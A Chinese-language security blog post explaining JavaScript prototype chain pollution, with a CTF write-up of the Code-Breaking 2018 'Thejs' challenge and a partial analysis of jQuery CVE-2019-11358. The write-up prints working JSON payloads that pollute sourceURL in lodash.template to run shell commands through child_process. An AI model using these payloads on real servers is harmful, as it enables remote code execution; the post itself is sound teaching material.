
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Web安全,JavaScript,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>浅析JavaScript原型链污染攻击 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        浅析JavaScript原型链污染攻击
      </h1>
      <span>
        
        <time class="time" datetime="2019-10-20T04:41:21.000Z">
        2019-10-20
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="JavaScript构造函数与类"><a href="#JavaScript构造函数与类" class="headerlink" title="JavaScript构造函数与类"></a>JavaScript构造函数与类</h3><p>在JavaScript中，构造函数相当于类，且可以将其实例化。</p>
<p>如果要定义一个类，需要以定义构造函数的方式来定义：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/1.png" alt=""></p>
<p>这里Foo函数的内容，就是Foo类的构造函数，而this.num就是Foo类的一个属性。</p>
<h3 id="JavaScript语法特性"><a href="#JavaScript语法特性" class="headerlink" title="JavaScript语法特性"></a>JavaScript语法特性</h3><p>在介绍JS原型链之前，需要了解下JS中一些访问对象的语法特性。</p>
<p>如图：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/2.png" alt=""></p>
<h3 id="JavaScript原型对象prototype与-proto"><a href="#JavaScript原型对象prototype与-proto" class="headerlink" title="JavaScript原型对象prototype与__proto__"></a>JavaScript原型对象prototype与__proto__</h3><h4 id="原型对象prototype"><a href="#原型对象prototype" class="headerlink" title="原型对象prototype"></a>原型对象prototype</h4><p>原型对象prototype是新对象的模板，它将自身的属性共享给新对象。一个对象不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。</p>
<p><strong>所有的JavaScript对象都会从一个原型对象prototype中继承属性和方法。</strong></p>
<p><strong>JavaScript的每一个函数/类都有一个prototype属性，用来指向该构造函数的原型。</strong></p>
<p>下面定义了一个Hacker函数，看到其有prototype属性、指向了该构造函数的原型本身：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/4.png" alt=""></p>
<h4 id="proto-属性"><a href="#proto-属性" class="headerlink" title="__proto__属性"></a>__proto__属性</h4><p><strong>JavaScript的每一个实例对象都有一个__proto__属性指向该实例对象的原型。</strong></p>
<p>下面新建一个Hacker类的实例对象hacker，看到其有__proto__属性，访问该属性可知是指向hacker这个实例对象的原型的：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/5.png" alt=""></p>
<p>观察发现，<strong>实例对象由函数生成，实例对象的__proto__属性是指向函数的prototype属性的</strong>，即：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/6.png" alt=""></p>
<p>接着我们注意到，在前面调用的无论是实例对象的__proto__属性还是构造函数/类的prototype属性，它们均有一个__proto__属性指向Object，而再往下调用__proto__属性就是在调用Object.__proto__、其值为null：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/7.png" alt=""></p>
<p>这个就涉及到后面要讲的原型链的东西了：<strong>所有JavaScript中的对象都是位于原型链顶端的Object的实例，其中实例对象原型的原型是Object.prototype，而它的原型是null，所以Object.prototype就是原型链的最顶端。</strong></p>
<h4 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h4><p>我们知道，构造函数/类的prototype属性指向该函数的原型，相应的该构造函数的原型也有相应的属性指向该构造函数——constructor属性。</p>
<p>每个原型对象都有一个constructor属性，指向相关联的构造函数，所以构造函数和构造函数的prototype即原型是可以相互指向的。实例对象也可以访问constructor属性指向其构造函数。</p>
<h3 id="JavaScript原型链与原型链继承"><a href="#JavaScript原型链与原型链继承" class="headerlink" title="JavaScript原型链与原型链继承"></a>JavaScript原型链与原型链继承</h3><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><p>由于__proto__是任何JavaScript对象都有的属性，而JavaScript中万物皆对象，因此会形成一条__proto__连起来的链，递归访问__proto__直至到终点即值为null，这就是原型链。</p>
<p>我们看前面用到的Hacker构造函数和hacker实例对象的例子，其原型链即类实例对象的原型链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker -&gt; Hacker.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p>这里改下smi1e的图，可以看到Hacker构造函数和hacker实例对象的原型链结构：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/9.png" alt=""></p>
<p>除了类实例对象的原型链，再看看其他的原型链。</p>
<p>数组的原型链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c -&gt; Array.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/10.png" alt=""></p>
<p>日期的原型链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d -&gt; Date.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p>函数的原型链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f -&gt; function.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/11.png" alt=""></p>
<h4 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h4><p>根据原型链，所有类对象在实例化的时候会拥有prototype中的属性和方法，在原型链上的任何位置设置属性都能被子对象访问到，这个特性被用来实现JavaScript中的继承机制。</p>
<p>当JavaScript引擎查找对象的属性时，会先查找对象本身是否存在该属性，若不存在则会在原型对链上查看、直到找到一个名字匹配的属性或到达原型链的末尾即null。这种查找机制被运用在面向对象的继承中，被称为原型链继承。</p>
<p>比如下面定义了构造函数Person，并创建了一个实例对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eyecolor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.firstName = first;</span><br><span class="line">  <span class="keyword">this</span>.lastName = last;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.eyeColor = eyecolor;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> alan = <span class="keyword">new</span> Person(<span class="string">"Alan"</span>, <span class="string">"Iverson"</span>, <span class="number">18</span>, <span class="string">"blue"</span>);</span><br></pre></td></tr></table></figure>
<p>如果我们想在已定义存在的Person类中直接添加属性是不行的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.nationality = <span class="string">"English"</span>;</span><br></pre></td></tr></table></figure>
<p>要添加的话只能在该构造函数定义的时候添加上该属性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eyecolor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.firstName = first;</span><br><span class="line">  <span class="keyword">this</span>.lastName = last;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.eyeColor = eyecolor;</span><br><span class="line">  <span class="keyword">this</span>.nationality = <span class="string">"English"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果都这样添加的话，实在是太麻烦了。这个时候就能用上原型链继承的方法来轻松实现给示例对象添加新属性的功能：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.nationality = <span class="string">"English"</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/8.png" alt=""></p>
<p>总结一下，对于实例对象alan，在调用alan.nationality的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在实例对象alan中寻找nationality；</li>
<li>如果找不到，则在alan.__proto__中寻找nationality；</li>
<li>如果仍然找不到，则继续在alan.__proto__.__proto__中寻找nationality；</li>
<li>依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null；</li>
</ol>
<h2 id="0x02-JavaScript原型链污染"><a href="#0x02-JavaScript原型链污染" class="headerlink" title="0x02 JavaScript原型链污染"></a>0x02 JavaScript原型链污染</h2><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>在JavaScript中访问一个对象的属性可以用a.b.c或者a[“b”][“c”]来访问。由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
<p>原型链污染一般会出现在对象或数组的键名或属性名可控，而且是赋值语句的情况下。</p>
<p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
<h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>那么什么场景会出现原型链污染呢？——一般是可以设置__proto__值的场景，即能够控制数组（对象）的键名的操作：</p>
<ul>
<li>对象merge，即合并数组对象的操作；</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>看个Demo：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hacker是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> hacker = &#123;<span class="attr">name</span>: <span class="string">"mi1k7ea"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hacker.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(hacker.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改hacker的原型（即Object）</span></span><br><span class="line">hacker.__proto__.name = <span class="string">"prototype attack!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，hacker.name仍然是mi1k7ea</span></span><br><span class="line"><span class="built_in">console</span>.log(hacker.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的user对象</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看user.name(user.name="prototype attack!")</span></span><br><span class="line"><span class="built_in">console</span>.log(user.name)</span><br></pre></td></tr></table></figure>
<p>可以看到，hacker实例对象本身就存在name属性，而通过hacker.__proto__.name设置的name属性实际就是设置hacker.__proto__指向的Object对象的name属性并进行了赋值，当再输出hacker实例对象的name属性时，由于JS引擎直接在当前hacker上找到该属性而无需继续往上到原型链上寻找name属性；但user实例对象是个空的对象、无任何属性，因此当尝试输出user对象的name属性值时JS引擎会在user对象的原型链上寻找name属性，其中在Object对象上找到了name属性就获取输出出来：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/12.png" alt=""></p>
<p>再看个P神文章中用到的merge()函数的例子，假设有如下的merge()函数定义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其在合并的过程中，存在赋值的操作target[key] = source[key]。因此，当我们控制target的键key为__proto__时就能污染原型链了。</p>
<p>先试下这个payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
<p>可以看到并未污染成功：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/13.png" alt=""></p>
<blockquote>
<p>这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “<strong>proto</strong>“: {b: 2}}）中，<strong>proto</strong>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，<strong>proto</strong>并不是一个key，自然也不会修改Object的原型。</p>
</blockquote>
<p>因此，我们需要将o2实例对象那部分改为Json格式，如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
<p>可以看到新建的o3实例对象也存在b属性，说明Object已经被污染了，这样就能成功进行原型链污染攻击了：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/14.png" alt=""></p>
<blockquote>
<p>这是因为，JSON解析的情况下，<strong>proto</strong>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
</blockquote>
<h2 id="0x03-Code-Breaking-2018-Thejs"><a href="#0x03-Code-Breaking-2018-Thejs" class="headerlink" title="0x03 Code-Breaking 2018 Thejs"></a>0x03 Code-Breaking 2018 Thejs</h2><p>这是P神在代码审计中出的一道JS原型链污染题目。</p>
<p>题目环境：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>访问页面，就是让你选两个项，添加之后就会缓存起来：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/15.png" alt=""></p>
<p>Add请求报文如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://test.com/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: grafana_session=37dd397e606027a65d2179c6a4d00d80</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">language%5B%5D=php&amp;category%5B%5D=web</span><br></pre></td></tr></table></figure>
<p>这题是需要进行代码审计的。</p>
<p>这里主要的代码都在server.js中，我们看其中关键部分：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>可以看到，这里存在一个用户输入点<code>lodash.merge(data, req.body)</code>，即在请求方法为POST时直接将req.body的值作为lodash.merge()的第二个参数传入，而我们在前面知道merge()函数是合并数组的操作，同时也是原型链污染的常见场景，因此我们可以通过POST方式传入的请求体内容来污染data数组。</p>
<p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。</p>
<p>我们去看下<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>的源码吧：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>options是一个对象，sourceURL取到了其options.sourceURL属性。这个属性原本是没有赋值的，默认取空字符串。</p>
<p>但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个sourceURL被拼接进new Function的第二个参数中，造成任意代码执行漏洞。</p>
</blockquote>
<p>了解一下，Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/16.png" alt=""></p>
<p>而Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/17.png" alt=""></p>
<p>再看下attempt是干啥的，在<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/attempt.js" target="_blank" rel="noopener">attemp.js</a>中有定义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>说到底attempt就是<code>func.apply()</code>，就是执行定义的函数。</p>
<p>那么options是怎么传进来的？我们回到server.js：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line"><span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br></pre></td></tr></table></figure>
<p>这里三个点是将options数组打散为序列的意思。到这我们还是不能确定options是否可控，但这没必要去考虑，因为我们通过原型链污染来污染Object.sourceURL，致使在寻找options.sourceURL时JS引擎还是能成功在options的原型链上找到该属性。</p>
<p>至此，也就是说，当我们通过原型链污染致使options.sourceURL存在值时，程序会将options.sourceURL污染值拼接到Function()的第二个参数中，导致任意代码执行。</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="缺陷payload"><a href="#缺陷payload" class="headerlink" title="缺陷payload"></a>缺陷payload</h4><p>根据上述分析，可以通过原型链污染致使Object存在污染进来的sourceURL属性，从而导致options也有sourceURL属性进而任意代码执行。</p>
<p>下面这个是有缺陷的payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\nreturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('ls /')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>e =&gt; { return ...}</code>是ES6的匿名函数创建语法，相当于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function(e)&#123; return ...;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p>
</blockquote>
<p>发送前，注意Content-Type改为application/json：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/18.png" alt=""></p>
<p>虽然能执行命令拿到flag，但是Web页面不能再直接访问了。这是因为只要在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务。</p>
<h4 id="优化payload"><a href="#优化payload" class="headerlink" title="优化payload"></a>优化payload</h4><p>在上一个基础上，在执行本次命令之前用for循环把之前的污染删掉：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\nreturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag_thepr0t0js')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>此时的Web服务能正常访问。</p>
<h2 id="0x04-jQuery原型污染漏洞（CVE-2019-11358）"><a href="#0x04-jQuery原型污染漏洞（CVE-2019-11358）" class="headerlink" title="0x04 jQuery原型污染漏洞（CVE-2019-11358）"></a>0x04 jQuery原型污染漏洞（CVE-2019-11358）</h2><p>在jQuery &lt; 3.4.0的版本中存在原型污染漏洞。</p>
<p>下面参考奇安信的漏洞分析。</p>
<p>在./src/core.js第155行中，options取传入的参数 arguments[i]：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((options = <span class="built_in">arguments</span>[ i ]) != <span class="literal">null</span>) &#123;</span><br></pre></td></tr></table></figure>
<p>而后在第158 、159 行中，将options遍历赋值给copy，即copy外部可控：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (name <span class="keyword">in</span> options) &#123;    copy= options [name];</span><br></pre></td></tr></table></figure>
<p>接着，在第167-185行中，判断copy是否是数组；若是，则调用jQuery.extend()函数，该函数用于将一个或多个对象的内容合并到目标对象，这里是将外部可控的copy数组扩展到target数组中；若copy非数组而是个对象，则直接将copy变量值赋值给target[name]：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Recurse if we're merging plain objects or arraysif ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) || ( copyIsArray = Array.isArray( copy ) ) ) ) &#123;    ...    // Never move original objects, clone them    target[ name ] = jQuery.extend( deep, clone, copy );    // Don't bring in undefined values&#125; else if ( copy !== undefined ) &#123;    target[ name ] = copy;&#125;</span></span><br></pre></td></tr></table></figure>
<p>此时，如果name可以被设置为<code>__proto__</code>，则会向上影响target的原型，进而覆盖造成原型污染。</p>
<p>往前面找，在第127行中可以看到，target数组是取传入的参数arguments[0]：</p>
